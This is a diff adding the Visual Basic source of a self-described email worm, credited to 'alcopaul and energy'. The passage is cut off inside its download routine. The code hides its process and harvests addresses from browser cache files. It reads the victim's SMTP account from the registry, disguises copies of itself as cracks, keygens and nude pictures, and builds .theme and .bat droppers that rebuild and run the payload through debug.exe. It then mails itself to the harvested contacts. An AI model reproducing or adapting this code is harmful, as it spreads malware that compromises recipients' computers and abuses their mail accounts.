@@ -1,0 +1,784 @@
+   '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+   'hobbit worm by alcopaul and energy\\\\
+   '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+   '
+   'this worm gathers 69 e-mail addies from the temporary internet files, downloads info-zip's zip.exe
+   'from a mirror site, prepares itself as a bat/scr/pif/exe attachment and as a debugscript bat/theme
+   '/zip attachment, sends the two attachment via smtp, spawns files for kazaa spreading and
+   'displays a message box..
+   '
+   'enjoy
+
+   'alcopaul and energy
+
+
+   VERSION 5.00
+   Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
+   Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
+   Begin VB.Form Form1
+      BorderStyle     =   0  'None
+      Caption         =   "Form1"
+      ClientHeight    =   90
+      ClientLeft      =   0
+      ClientTop       =   0
+      ClientWidth     =   90
+      LinkTopic       =   "Form1"
+      ScaleHeight     =   90
+      ScaleWidth      =   90
+      ShowInTaskbar   =   0   'False
+      StartUpPosition =   3  'Windows Default
+      Begin MSWinsockLib.Winsock Winsock1
+         Left            =   600
+         Top             =   240
+         _ExtentX        =   741
+         _ExtentY        =   741
+         _Version        =   393216
+      End
+      Begin InetCtlsObjects.Inet Inet1
+         Left            =   0
+         Top             =   120
+         _ExtentX        =   1005
+         _ExtentY        =   1005
+         _Version        =   393216
+      End
+   End
+   Attribute VB_Name = "Form1"
+   Attribute VB_GlobalNameSpace = False
+   Attribute VB_Creatable = False
+   Attribute VB_PredeclaredId = True
+   Attribute VB_Exposed = False
+   Option Explicit
+   Private Response As String
+   Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
+   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
+   Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
+   Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
+   Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long
+   Const CSIDL_TIF = &H20
+   Private Type SHITEMID
+   cb As Long
+   abID As Byte
+   End Type
+   Private Type ITEMIDLIST
+   mkid As SHITEMID
+   End Type
+
+   Sub wer567(dir)
+   On Error Resume Next
+   Dim fso, ssfh, filh, s, f, d, q, a, textline
+   Set fso = CreateObject("Scripting.FileSystemObject")
+   Set ssfh = fso.GetFolder(dir).SubFolders
+   For Each filh In ssfh
+   wfuck filh
+   Next
+   End Sub
+   Sub wfuck(dir)
+   On Error Resume Next
+   Dim fso, ssfh, filh, s, f, d, q, a, textline, ddd, arr1, aaa, sdir
+   Set fso = CreateObject("Scripting.FileSystemObject")
+   Set ssfh = fso.GetFolder(dir).SubFolders
+   For Each filh In ssfh
+   DoEvents
+   ddd = ddd & filh & "/"
+   Next
+   arr1 = Split(ddd, "/")
+   For Each sdir In arr1
+   If sdir = "" Then Exit For
+   aaa = aaa & q23w45(sdir)
+   Next sdir
+   Open aPath & "email.txt" For Output As #1
+   Print #1, aaa
+   Close #1
+   Open aPath & "email.txt" For Input As #1
+   Do While Not EOF(1)
+   Line Input #1, textline
+   q = q & textline
+   Loop
+   Close #1
+   q = Replace(q, "A#?@;", "")
+   q = Replace(q, "A#?$;", "")
+   Open aPath & "email.txt" For Output As #1
+   Print #1, q
+   Close #1
+   End Sub
+   Function q23w45(dir)
+   Dim fso, cfh, filh, ext, textline, q, wwww, aaaa
+   Set fso = CreateObject("Scripting.FileSystemObject")
+   Set cfh = fso.GetFolder(dir).Files
+   For Each filh In cfh
+   DoEvents
+   ext = fso.GetExtensionName(filh.Path)
+   ext = LCase(ext)
+   If (ext = "htm") Or (ext = "html") Then
+   aaaa = aaaa & xtrk(filh.Path)
+   End If
+   Next
+   q23w45 = aaaa
+   End Function
+   Function xtrk(gggg As String)
+   Dim j As Long, cnt As Long, q As String, mlto As String, wwww As String
+   Dim textline
+   Open gggg For Input As #1
+   Do While Not EOF(1)
+   Line Input #1, textline
+   q = q & textline
+   Loop
+   Close #1
+   For j = 1 To Len(q)
+   If Mid(q, j, 8) = """" & "mailto:" Then
+   mlto = ""
+   cnt = 0
+   Do While Mid(q, j + 8 + cnt, 1) <> """"
+   mlto = mlto + Mid(q, j + 8 + cnt, 1)
+   cnt = cnt + 1
+   Loop
+   If InStr(1, mlto, "@") Then
+   Else
+   mlto = "A#?@"
+   End If
+   If InStr(1, mlto, "?") Then
+   mlto = "A#?$"
+   End If
+   mlto = Trim(mlto)
+   wwww = wwww & mlto & ";"
+   End If
+   Next
+   xtrk = wwww
+   End Function
+   Private Function GetSpecialfolder(CSIDL As Long) As String
+   Dim r As Long
+   Dim IDL As ITEMIDLIST
+   Dim Path As String
+   r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
+   If r = 0 Then
+   Path$ = Space$(512)
+   r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal Path$)
+   GetSpecialfolder = Left$(Path, InStr(Path, Chr$(0)) - 1)
+   Exit Function
+   End If
+   GetSpecialfolder = ""
+   End Function
+
+   Sub limitto69()
+   Dim textline, q, reya, cunt, num, reya1, adik, dddd, maily, num1
+   Open aPath & "e-mail.txt" For Input As #1
+   Do While Not EOF(1)
+   Line Input #1, textline
+   q = q & textline
+   Loop
+   Close #1
+   q = Mid(q, 1, (Len(q) - 1))
+   reya = Split(q, ";")
+   For Each maily In reya
+   cunt = cunt + 1
+   Next maily
+   num = cunt - 1
+   MsgBox cunt
+   If cunt < 70 Then
+   q = Mid(q, 1, (Len(q) - 1))
+   reya1 = Split(q, ";")
+   For num1 = 0 To num
+   Randomize
+   adik = reya1(Int(Rnd * num))
+   dddd = dddd & adik & ";"
+   Next num1
+   dddd = Mid(dddd, 1, (Len(dddd) - 1))
+   Else
+   q = Mid(q, 1, (Len(q) - 1))
+   reya1 = Split(q, ";")
+   For num1 = 0 To 68
+   Randomize
+   adik = reya1(Int(Rnd * num))
+   dddd = dddd & adik & ";"
+   Next num1
+   dddd = Mid(dddd, 1, (Len(dddd) - 1))
+   End If
+   Open aPath & "e-mail.txt" For Output As #1
+   Print #1, dddd
+   Close #1
+   End Sub
+
+   Private Sub Form_Load()
+   On Error Resume Next
+   Dim proc As Long
+   Dim mailserver As String, eman As String, emanaddy As String, a45 As String, b45 As String
+   Dim mailie As String, addy As String
+   Dim registry
+   'hide process in taskbar
+   proc = GetCurrentProcessId()
+   RegisterServiceProcess proc, 1
+   'end hide process
+   '================
+
+   'gather some mails
+   wer567 GetSpecialfolder(CSIDL_TIF)
+   'end gather some mails
+
+   'limit mail addies to 69 people only
+   Call limitto69
+   'end limit
+   konekt:
+   If InternetGetConnectedState(0&, 0&) = 0 Then GoTo konekt
+   Do While FileLen(aPath & "email.txt") = 0
+   DoEvents
+   Loop
+   Call downloadzip
+   Set registry = CreateObject("WScript.Shell")
+   mailserver = registry.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Server")
+   If mailserver = "" Then
+   mailserver = "mail.shepardlaw.com"
+   End If
+   eman = registry.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Display Name")
+   If eman = "" Then
+   eman = "User"
+   End If
+   emanaddy = registry.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Email Address")
+   If emanaddy = "" Then
+   emanaddy = "webmaster@luckyme.com"
+   End If
+   a45 = AttachName()
+   generateattchment a45
+   b45 = AttachName1()
+   generateattchment1 b45, a45
+   Open aPath & "email.txt" For Input As #1
+   Do While Not EOF(1)
+   Line Input #1, mailie
+   addy = addy & mailie
+   Loop
+   Close #1
+   dddddd mailserver, emanaddy, addy, "RE:", "files for you - from " & eman, aPath & a45, aPath & b45
+   Call KaZaA
+   Call Done
+   End Sub
+
+   Function dddddd(mailsrv As String, send As String, recip As String, subj As String, mess As String, attch As String, attch1 As String)
+   Dim collon As String, strserver As String, proxy As Long
+   Dim arr1, mail
+   arr1 = Split(recip, ";")
+   For Each mail In arr1
+   Winsock1.LocalPort = 0
+   If Winsock1.State = sckClosed Then
+   Winsock1.Protocol = sckTCPProtocol
+   strserver = Trim(mailsrv)
+   collon = InStr(strserver, ":")
+   If collon = 0 Then
+   Winsock1.Connect strserver, 25
+   Else
+   proxy = CLng(Right$(strserver, Len(strserver) - collon))
+   strserver = Left$(strserver, collon - 1)
+   Winsock1.Connect strserver, proxy
+   End If
+   W4C ("220")
+   Winsock1.SendData "HELO " & dom(send) & vbCrLf
+   W4C ("250")
+   Winsock1.SendData "MAIL FROM:" & "<" & send & ">" & vbCrLf
+   W4C ("250")
+   Winsock1.SendData "RCPT TO: " & "<" & mail & ">" & vbCrLf
+   W4C ("250")
+   Winsock1.SendData "DATA" & vbCrLf
+   W4C ("354")
+   Winsock1.SendData "From:" & send & " <" & send & ">" & vbCrLf
+   Winsock1.SendData "To:" & mail & " <" & mail & ">" & vbCrLf
+   Winsock1.SendData "Subject:" & subj & vbCrLf & vbCrLf
+   Winsock1.SendData mess & vbCrLf & vbCrLf & UUEncodeFile(attch) & vbCrLf & UUEncodeFile(attch1) & vbCrLf
+   Winsock1.SendData vbCrLf & "." & vbCrLf
+   W4C ("250")
+   Winsock1.SendData "QUIT" & vbCrLf
+   W4C ("221")
+   Winsock1.Close
+   dddddd = True
+   Else
+   End If
+   Next mail
+   End Function
+   Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
+   Winsock1.GetData Response
+   End Sub
+   Private Sub W4C(ResponseCode As String)
+   Dim TT As Single
+   Dim ttt As Single
+   TT = Timer
+   While Len(Response) = 0
+   ttt = TT - Timer
+   DoEvents
+   If ttt > 24 Then
+   Exit Sub
+   End If
+   Sleep 1
+   Wend
+   While Left(Response, 3) <> ResponseCode
+   DoEvents
+   If ttt > 50 Then
+   Exit Sub
+   End If
+   Sleep 1
+   Wend
+   Response = ""
+   End Sub
+   Private Function dom(strPath As String) As String
+     dom = Mid(strPath, InStrRev(strPath, "@") + 1)
+   End Function
+   Public Function UUEncodeFile(strFilePath As String) As String
+   Dim intFile         As Integer
+   Dim intTempFile     As Integer
+   Dim lFileSize       As Long
+   Dim strFileName     As String
+   Dim strFileData     As String
+   Dim lEncodedLines   As Long
+   Dim strTempLine     As String
+   Dim i               As Long
+   Dim j               As Integer
+   Dim strResult       As String
+   strFileName = Mid$(strFilePath, InStrRev(strFilePath, "\") + 1)
+   strResult = "begin 664 " + strFileName + vbCrLf
+   lFileSize = FileLen(strFilePath)
+   lEncodedLines = lFileSize \ 45 + 1
+   strFileData = Space(45)
+   intFile = FreeFile
+   Open strFilePath For Binary As intFile
+   For i = 1 To lEncodedLines
+   If i = lEncodedLines Then
+   strFileData = Space(lFileSize Mod 45)
+   End If
+   Get intFile, , strFileData
+   strTempLine = Chr(Len(strFileData) + 32)
+   If i = lEncodedLines And (Len(strFileData) Mod 3) Then
+   strFileData = strFileData + Space(3 - (Len(strFileData) Mod 3))
+   End If
+   For j = 1 To Len(strFileData) Step 3
+   strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j, 1)) \ 4 + 32)
+   strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j, 1)) Mod 4) * 16 _
+                                  + Asc(Mid(strFileData, j + 1, 1)) \ 16 + 32)
+   strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j + 1, 1)) Mod 16) * 4 _
+                                  + Asc(Mid(strFileData, j + 2, 1)) \ 64 + 32)
+   strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j + 2, 1)) Mod 64 + 32)
+   Next j
+   strTempLine = Replace(strTempLine, " ", "`")
+   strResult = strResult + strTempLine + vbCrLf
+   strTempLine = ""
+   Next i
+   Close intFile
+   strResult = strResult & "`" & vbCrLf + "end" + vbCrLf
+   UUEncodeFile = strResult
+   End Function
+
+
+   Function AttachName() As String
+   On Error Resume Next
+   Dim M, Filename_
+   Randomize
+   M = Int((124 * Rnd) + 1)
+   If M = 0 Then
+   M = 1
+   End If
+   If M = 1 Then Filename_ = "I-Explorer7.0.exe"
+   If M = 2 Then Filename_ = "Morpheus_Update_Fix.exe"
+   If M = 3 Then Filename_ = "Kaza_Lite_Update_Fix.exe"
+   If M = 4 Then Filename_ = "Kaza_Fix.exe"
+   If M = 5 Then Filename_ = "Edonkey_Fix.exe"
+   If M = 6 Then Filename_ = "WinXP_Crack.exe"
+   If M = 7 Then Filename_ = "Symantec_KeyGen.exe"
+   If M = 8 Then Filename_ = "McAffea_KeyGen.exe"
+   If M = 9 Then Filename_ = "Flock_Update.exe"
+   If M = 10 Then Filename_ = "Bearshare_Fix.exe"
+   If M = 11 Then Filename_ = "New_Napster_Clone.exe"
+   If M = 12 Then Filename_ = "Pamela_Live_Fucking.exe"
+   If M = 13 Then Filename_ = "Beyond_FF11.exe"
+   If M = 14 Then Filename_ = "Final_Fantasy10.exe"
+   If M = 15 Then Filename_ = "Reboot.exe"
+   If M = 16 Then Filename_ = "Claudia_Schiffer.exe"
+   If M = 17 Then Filename_ = "FullSpeed.exe"
+   If M = 18 Then Filename_ = "Email Bomber.exe"
+   If M = 19 Then Filename_ = "FTP Cracker.exe"
+   If M = 20 Then Filename_ = "Hotmail Hacker Tool.exe"
+   If M = 21 Then Filename_ = "Anti 0190 Dialer.exe"
+   If M = 22 Then Filename_ = "WinMx Hack.exe"
+   If M = 23 Then Filename_ = "Britney Spears Nude.exe"
+   If M = 24 Then Filename_ = "Shakira Nude.exe"
+   If M = 25 Then Filename_ = "Jenifer Lopez Naked.exe"
+   If M = 26 Then Filename_ = "Ps2 Emulator.exe"
+   If M = 27 Then Filename_ = "Cube Emulator.exe"
+   If M = 28 Then Filename_ = "Ps2 Crack.exe"
+   If M = 29 Then Filename_ = "XBox Emulator.exe"
+   If M = 30 Then Filename_ = "Borland Delphi 6 Key.exe"
+   If M = 31 Then Filename_ = "Borland Delphi(all) Crack.exe"
+   If M = 32 Then Filename_ = "I-Explorer7.0.pif"
+   If M = 33 Then Filename_ = "Morpheus_Update_Fix.pif"
+   If M = 34 Then Filename_ = "Kaza_Lite_Update_Fix.pif"
+   If M = 35 Then Filename_ = "Kaza_Fix.pif"
+   If M = 36 Then Filename_ = "Edonkey_Fix.pif"
+   If M = 37 Then Filename_ = "WinXP_Crack.pif"
+   If M = 38 Then Filename_ = "Symantec_KeyGen.pif"
+   If M = 39 Then Filename_ = "McAffea_KeyGen.pif"
+   If M = 40 Then Filename_ = "Flock_Update.pif"
+   If M = 41 Then Filename_ = "Bearshare_Fix.pif"
+   If M = 42 Then Filename_ = "New_Napster_Clone.pif"
+   If M = 43 Then Filename_ = "Pamela_Live_Fucking.pif"
+   If M = 44 Then Filename_ = "Beyond_FF11.pif"
+   If M = 45 Then Filename_ = "Final_Fantasy10.pif"
+   If M = 46 Then Filename_ = "Reboot.pif"
+   If M = 47 Then Filename_ = "Claudia_Schiffer.pif"
+   If M = 48 Then Filename_ = "FullSpeed.pif"
+   If M = 49 Then Filename_ = "Email Bomber.pif"
+   If M = 50 Then Filename_ = "FTP Cracker.pif"
+   If M = 51 Then Filename_ = "Hotmail Hacker Tool.pif"
+   If M = 52 Then Filename_ = "Anti 0190 Dialer.pif"
+   If M = 53 Then Filename_ = "WinMx Hack.pif"
+   If M = 54 Then Filename_ = "Britney Spears Nude.pif"
+   If M = 55 Then Filename_ = "Shakira Nude.pif"
+   If M = 56 Then Filename_ = "Jenifer Lopez Naked.pif"
+   If M = 57 Then Filename_ = "Ps2 Emulator.pif"
+   If M = 58 Then Filename_ = "Cube Emulator.pif"
+   If M = 59 Then Filename_ = "Ps2 Crack.pif"
+   If M = 60 Then Filename_ = "XBox Emulator.pif"
+   If M = 61 Then Filename_ = "Borland Delphi 6 Key.pif"
+   If M = 62 Then Filename_ = "Borland Delphi(all) Crack.pif"
+   If M = 63 Then Filename_ = "I-Explorer7.0.bat"
+   If M = 64 Then Filename_ = "Morpheus_Update_Fix.bat"
+   If M = 65 Then Filename_ = "Kaza_Lite_Update_Fix.bat"
+   If M = 66 Then Filename_ = "Kaza_Fix.bat"
+   If M = 67 Then Filename_ = "Edonkey_Fix.bat"
+   If M = 68 Then Filename_ = "WinXP_Crack.bat"
+   If M = 69 Then Filename_ = "Symantec_KeyGen.bat"
+   If M = 70 Then Filename_ = "McAffea_KeyGen.bat"
+   If M = 71 Then Filename_ = "Flock_Update.bat"
+   If M = 72 Then Filename_ = "Bearshare_Fix.bat"
+   If M = 73 Then Filename_ = "New_Napster_Clone.bat"
+   If M = 74 Then Filename_ = "Pamela_Live_Fucking.bat"
+   If M = 75 Then Filename_ = "Beyond_FF11.bat"
+   If M = 76 Then Filename_ = "Final_Fantasy10.bat"
+   If M = 77 Then Filename_ = "Reboot.bat"
+   If M = 78 Then Filename_ = "Claudia_Schiffer.bat"
+   If M = 79 Then Filename_ = "FullSpeed.bat"
+   If M = 80 Then Filename_ = "Email Bomber.bat"
+   If M = 81 Then Filename_ = "FTP Cracker.bat"
+   If M = 82 Then Filename_ = "Hotmail Hacker Tool.bat"
+   If M = 83 Then Filename_ = "Anti 0190 Dialer.bat"
+   If M = 84 Then Filename_ = "WinMx Hack.bat"
+   If M = 85 Then Filename_ = "Britney Spears Nude.bat"
+   If M = 86 Then Filename_ = "Shakira Nude.bat"
+   If M = 87 Then Filename_ = "Jenifer Lopez Naked.bat"
+   If M = 88 Then Filename_ = "Ps2 Emulator.bat"
+   If M = 89 Then Filename_ = "Cube Emulator.bat"
+   If M = 90 Then Filename_ = "Ps2 Crack.bat"
+   If M = 91 Then Filename_ = "XBox Emulator.bat"
+   If M = 92 Then Filename_ = "Borland Delphi 6 Key.bat"
+   If M = 93 Then Filename_ = "Borland Delphi(all) Crack.bat"
+   If M = 94 Then Filename_ = "I-Explorer7.0.scr"
+   If M = 95 Then Filename_ = "Morpheus_Update_Fix.scr"
+   If M = 96 Then Filename_ = "Kaza_Lite_Update_Fix.scr"
+   If M = 97 Then Filename_ = "Kaza_Fix.scr"
+   If M = 98 Then Filename_ = "Edonkey_Fix.scr"
+   If M = 99 Then Filename_ = "WinXP_Crack.scr"
+   If M = 100 Then Filename_ = "Symantec_KeyGen.scr"
+   If M = 101 Then Filename_ = "McAffea_KeyGen.scr"
+   If M = 102 Then Filename_ = "Flock_Update.scr"
+   If M = 103 Then Filename_ = "Bearshare_Fix.scr"
+   If M = 104 Then Filename_ = "New_Napster_Clone.scr"
+   If M = 105 Then Filename_ = "Pamela_Live_Fucking.scr"
+   If M = 106 Then Filename_ = "Beyond_FF11.scr"
+   If M = 107 Then Filename_ = "Final_Fantasy10.scr"
+   If M = 108 Then Filename_ = "Reboot.scr"
+   If M = 109 Then Filename_ = "Claudia_Schiffer.scr"
+   If M = 110 Then Filename_ = "FullSpeed.scr"
+   If M = 111 Then Filename_ = "Email Bomber.scr"
+   If M = 112 Then Filename_ = "FTP Cracker.scr"
+   If M = 113 Then Filename_ = "Hotmail Hacker Tool.scr"
+   If M = 114 Then Filename_ = "Anti 0190 Dialer.scr"
+   If M = 115 Then Filename_ = "WinMx Hack.scr"
+   If M = 116 Then Filename_ = "Britney Spears Nude.scr"
+   If M = 117 Then Filename_ = "Shakira Nude.scr"
+   If M = 118 Then Filename_ = "Jenifer Lopez Naked.scr"
+   If M = 119 Then Filename_ = "Ps2 Emulator.scr"
+   If M = 120 Then Filename_ = "Cube Emulator.scr"
+   If M = 121 Then Filename_ = "Ps2 Crack.scr"
+   If M = 122 Then Filename_ = "XBox Emulator.scr"
+   If M = 123 Then Filename_ = "Borland Delphi 6 Key.scr"
+   If M = 124 Then Filename_ = "Borland Delphi(all) Crack.scr"
+   AttachName = Filename_
+   End Function
+
+   Function generateattchment(fff As String)
+   On Error Resume Next
+   Dim sourcefileexe As String, sourcefilescr As String, sourcefilebat As String, sourcefilepif As String
+   sourcefileexe = aPath & App.EXEName & ".exe" 'we dont know if actual
+   sourcefilescr = aPath & App.EXEName & ".scr" 'name is .exe or .scr :(
+   sourcefilebat = aPath & App.EXEName & ".bat" 'we dont know if actual
+   sourcefilepif = aPath & App.EXEName & ".pif" 'name is .exe or .scr :(
+   FileCopy sourcefileexe, aPath & fff
+   FileCopy sourcefilescr, aPath & fff
+   FileCopy sourcefilebat, aPath & fff
+   FileCopy sourcefilepif, aPath & fff
+   End Function
+
+   Function AttachName1() As String
+   Dim M, Filename_
+   Randomize
+   M = Int((85 * Rnd))
+   If M = 0 Then
+   M = 1
+   End If
+   If M = 1 Then Filename_ = "Shakira Nude.theme"
+   If M = 2 Then Filename_ = "BackstreetBoys.theme"
+   If M = 3 Then Filename_ = "Goldfinger.theme"
+   If M = 4 Then Filename_ = "Shrek.theme"
+   If M = 5 Then Filename_ = "LordoftheRings.theme"
+   If M = 6 Then Filename_ = "StarWars.theme"
+   If M = 7 Then Filename_ = "MichelleBranch.theme"
+   If M = 8 Then Filename_ = "TheHives.theme"
+   If M = 9 Then Filename_ = "DrNo.theme"
+   If M = 10 Then Filename_ = "JamesBond.theme"
+   If M = 11 Then Filename_ = "NSync.theme"
+   If M = 12 Then Filename_ = "AddamsFamily.theme"
+   If M = 13 Then Filename_ = "SamuraiX.theme"
+   If M = 14 Then Filename_ = "DragonballZ.theme"
+   If M = 15 Then Filename_ = "Hackers.theme"
+   If M = 16 Then Filename_ = "PlayboyCenterFolds.theme"
+   If M = 17 Then Filename_ = "BritneySpearsNude.theme"
+   If M = 18 Then Filename_ = "ChristinaAguilera.theme"
+   If M = 19 Then Filename_ = "Energy.theme"
+   If M = 20 Then Filename_ = "alcopaul.theme"
+   If M = 21 Then Filename_ = "XXX.theme"
+   If M = 22 Then Filename_ = "NicoleKidmanFuck.theme"
+   If M = 23 Then Filename_ = "CourtneyCoxNude.theme"
+   If M = 24 Then Filename_ = "LearnVisualBasic.zip"
+   If M = 25 Then Filename_ = "LearnVisualC.zip"
+   If M = 26 Then Filename_ = "LearnVisualFoxPro.zip"
+   If M = 27 Then Filename_ = "LearnPHP.zip"
+   If M = 28 Then Filename_ = "LearnHTML.zip"
+   If M = 29 Then Filename_ = "LearnKylix.zip"
+   If M = 30 Then Filename_ = "SecretsOfMicrosoftdotNET.zip"
+   If M = 31 Then Filename_ = "LearnCSharp.zip"
+   If M = 32 Then Filename_ = "LearnVisualBasic.NET.zip"
+   If M = 33 Then Filename_ = "CplusplusUnleashed.zip"
+   If M = 34 Then Filename_ = "Hacking101.zip"
+   If M = 35 Then Filename_ = "EroticStories.zip"
+   If M = 36 Then Filename_ = "SecretsofLaoTse.zip"
+   If M = 37 Then Filename_ = "Phreaking.zip"
+   If M = 38 Then Filename_ = "CIASecrets.zip"
+   If M = 39 Then Filename_ = "VirusWriting.zip"
+   If M = 40 Then Filename_ = "TipsOnMakingYourPartnerWild.zip"
+   If M = 41 Then Filename_ = "CreditCardNumbers.zip"
+   If M = 42 Then Filename_ = "NewsweekSeptemberEditionCompressed.zip"
+   If M = 43 Then Filename_ = "TroubleshootingyourComputer.zip"
+   If M = 44 Then Filename_ = "CounterStrikeCheats.zip"
+   If M = 45 Then Filename_ = "JokeForTheDay.zip"
+   If M = 46 Then Filename_ = "MakeMillions.zip"
+   If M = 47 Then Filename_ = "YouWantToBeAMillionaire.zip"
+   If M = 48 Then Filename_ = "DisneyBedTimeStories.zip"
+   If M = 49 Then Filename_ = "StephenKingUnreleasedNotes.zip"
+   If M = 50 Then Filename_ = "NikolaTeslaNotes.zip"
+   If M = 51 Then Filename_ = "SecretsOfAlbertEinstein.zip"
+   If M = 52 Then Filename_ = "ThomasEdisonSecrets.zip"
+   If M = 53 Then Filename_ = "AlexanderGrahamBellSecrets.zip"
+   If M = 54 Then Filename_ = "HackSQLServersScript.bat"
+   If M = 55 Then Filename_ = "HackIISServersScript.bat"
+   If M = 56 Then Filename_ = "HackMozillaServersScript.bat"
+   If M = 57 Then Filename_ = "HackHotmailScript.bat"
+   If M = 58 Then Filename_ = "HackYahooScript.bat"
+   If M = 59 Then Filename_ = "HackApacheServersScript.bat"
+   If M = 60 Then Filename_ = "HackXBoxScript.bat"
+   If M = 61 Then Filename_ = "HackPayPalScript.bat"
+   If M = 62 Then Filename_ = "WindowsSourceCodeRedirect.bat"
+   If M = 63 Then Filename_ = "RedirectMeToHollywood.bat"
+   If M = 64 Then Filename_ = "Morpheus_Update_Fix.bat"
+   If M = 65 Then Filename_ = "Kaza_Lite_Update_Fix.bat"
+   If M = 66 Then Filename_ = "Kaza_Fix.bat"
+   If M = 67 Then Filename_ = "Edonkey_Fix.bat"
+   If M = 68 Then Filename_ = "WinXP_Crack.bat"
+   If M = 69 Then Filename_ = "Symantec_KeyGen.bat"
+   If M = 70 Then Filename_ = "McAffea_KeyGen.bat"
+   If M = 71 Then Filename_ = "Flock_Update.bat"
+   If M = 72 Then Filename_ = "Bearshare_Fix.bat"
+   If M = 73 Then Filename_ = "New_Napster_Clone.bat"
+   If M = 74 Then Filename_ = "Pamela_Live_Fucking.bat"
+   If M = 75 Then Filename_ = "Beyond_FF11.bat"
+   If M = 76 Then Filename_ = "Final_Fantasy10.bat"
+   If M = 77 Then Filename_ = "Reboot.bat"
+   If M = 78 Then Filename_ = "Claudia_Schiffer.bat"
+   If M = 79 Then Filename_ = "FullSpeed.bat"
+   If M = 80 Then Filename_ = "Email Bomber.bat"
+   If M = 81 Then Filename_ = "FTP Cracker.bat"
+   If M = 82 Then Filename_ = "Hotmail Hacker Tool.bat"
+   If M = 83 Then Filename_ = "Anti 0190 Dialer.bat"
+   If M = 84 Then Filename_ = "WinMx Hack.bat"
+   If M = 85 Then Filename_ = "Britney Spears Nude.bat"
+   AttachName1 = Filename_
+   End Function
+
+   Sub generateattchment1(fff As String, ggg As String)
+   Dim sourcefilezip As String, sourcefiletheme As String, sourcefilebat As String
+   Dim a11, a22, a33, a44
+   On Error Resume Next
+   sourcefilezip = aPath & "temp.zip"
+   sourcefiletheme = aPath & "temp.theme"
+   sourcefilebat = aPath & "temp.bat"
+   If LCase(dom1(fff)) = LCase("zip") Then
+   Shell aPath & "zippy.exe " & aPath & "temp.zip " & aPath & ggg, vbHide
+   FileCopy sourcefilezip, aPath & fff
+   End If
+   If LCase(dom1(fff)) = LCase("theme") Then
+   Randomize
+   a11 = Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9)
+   a22 = Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9)
+   Open aPath & "temp.theme" For Output As #1
+   Print #1, "@echo off"
+   Print #1, "ctty nul"
+   Print #1, g1(aPath & ggg)
+   Print #1, "echo rcx>>" & a11
+   Print #1, "echo " & Hex(FileLen(aPath & ggg)) & ">>" & a11
+   Print #1, "echo n" & aPath & a22 & ".pif" & ">>" & a11
+   Print #1, "echo w>>" & a11
+   Print #1, "echo q>>" & a11
+   Print #1, "debug < " & a11
+   Print #1, "del " & a11
+   Print #1, aPath & a22 & ".pif"
+   Print #1, "ctty con"
+   Print #1, "exit"
+   Print #1, ""
+   Print #1, "[boot]"
+   Print #1, "SCRNSAVE.EXE=command.com /c copy " & aPath & fff & " " & aPath & a11 & ".bat /Y | " & aPath & a11 & ".bat |"
+   Print #1, ""
+   Print #1, "[MasterThemeSelector]"
+   Print #1, "MTSM = DABJDKT"
+   Print #1, ""
+   Close #1
+   FileCopy sourcefiletheme, aPath & fff
+   End If
+   If LCase(dom1(fff)) = LCase("bat") Then
+   Randomize
+   a33 = Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9)
+   a44 = Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9)
+   Open aPath & "temp.bat" For Output As #1
+   Print #1, "@echo off"
+   Print #1, "ctty nul"
+   Print #1, g1(aPath & ggg)
+   Print #1, "echo rcx>>" & a33
+   Print #1, "echo " & Hex(FileLen(aPath & ggg)) & ">>" & a33
+   Print #1, "echo n" & aPath & a44 & ".pif" & ">>" & a33
+   Print #1, "echo w>>" & a33
+   Print #1, "echo q>>" & a33
+   Print #1, "debug < " & a33
+   Print #1, "del " & a33
+   Print #1, aPath & a44 & ".pif"
+   Print #1, "ctty con"
+   Print #1, "exit"
+   Close #1
+   FileCopy sourcefilebat, aPath & fff
+   End If
+   End Sub
+   Private Function dom1(strPath As String) As String
+     dom1 = Mid(strPath, InStrRev(strPath, ".") + 1)
+   End Function
+
+   Function aPath() As String
+   Dim wdir As String
+   wdir = App.Path
+   If Right(wdir, 1) <> "\" Then wdir = wdir & "\"
+   aPath = wdir
+   End Function
+
+
+   Sub downloadzip()
+   On Error Resume Next
+   Dim databyte() As Byte
+   Inet1.RequestTimeout = 40
